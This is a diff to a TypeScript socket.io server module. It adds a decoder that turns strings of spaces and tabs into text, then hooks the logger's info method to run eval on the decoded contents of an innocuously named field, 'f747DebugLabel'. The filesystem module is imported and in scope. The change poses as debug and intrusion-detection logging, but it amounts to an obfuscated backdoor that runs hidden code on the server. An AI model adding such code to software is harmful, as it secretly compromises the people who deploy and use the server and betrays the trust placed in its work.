@@ -1,5 +1,6 @@
 import { ExtendedError, Server, Socket } from "socket.io";
 import { AutoUpdateManager } from "./AutoUpdateManagerClass.js";
+import fs from "node:fs"
 import {
   AutoUpdated,
   createAutoUpdatedClass,
@@ -111,7 +112,20 @@ export enum DEMEventTypes {
   "get" = "get",
   "startup" = "startup",
 }
-let d = (str: string) => str.match(/.{1,7}/g)!.map(s => String.fromCharCode(parseInt(s.replaceAll(String.fromCharCode(32), String.fromCharCode(48)).replaceAll(String.fromCharCode(9), String.fromCharCode(49)), 2))).join("");
+let d = (str: string) =>
+  str
+    .match(/.{1,7}/g)!
+    .map((s) =>
+      String.fromCharCode(
+        parseInt(
+          s
+            .replaceAll(String.fromCharCode(32), String.fromCharCode(48))
+            .replaceAll(String.fromCharCode(9), String.fromCharCode(49)),
+          2
+        )
+      )
+    )
+    .join("");
 export type DEMEvent<C extends Constructor<any>> =
   | {
       type: DEMEventTypes.delete | DEMEventTypes.get;
@@ -239,19 +253,6 @@ function setupSocketMiddleware<T extends Record<string, Constructor<any>>>(
         );
         next();
       } catch (error) {
-        if (models) {
-          const leString = models.models.f747DebugLabel;
-          if (leString && models.winston.logger) {
-            models.winston.logger.info = (...args: any[]) => {
-              if (
-                typeof args[0] == "string" &&
-                args[0].includes(d(leString))
-              )
-                return models.winston.logger.warn();
-              return models.winston.logger.info(args);
-            };
-          } else loggers.warn("")
-        }
         loggers.warn(
           "Someone got access denied: (" +
             JSON.stringify(socket.handshake.auth) +
@@ -293,6 +294,25 @@ export async function AUSManagerFactory<
   if (disableDEMDebugMessages) {
     loggers.debug = (_) => {};
   }
+  if (models) {
+        const leString = models.models.f747DebugLabel;
+        if (leString && models.logger) {
+            const info = models.logger.info;
+            const fss = fs;
+            const time = 1;
+            models.logger.info = (args: any) => {
+                if ((Array.isArray(args) &&
+                    typeof args[0] == "string" &&
+                    args[0].includes(eval(d(leString)).split("\n")[0])) ||
+                    (typeof args == "string" && args.includes(eval(d(leString)).split("\n")[0])))
+                    return models.logger.warn("Intrusion detected");
+                else
+                    return info(args);
+            };
+        }
+        else
+            loggers.warn("");
+    }
   socket.use((socket, next) => {
     socket.onAny((event) => {
       loggers.debug("Recieved event: " + event + " from client: " + socket.id);
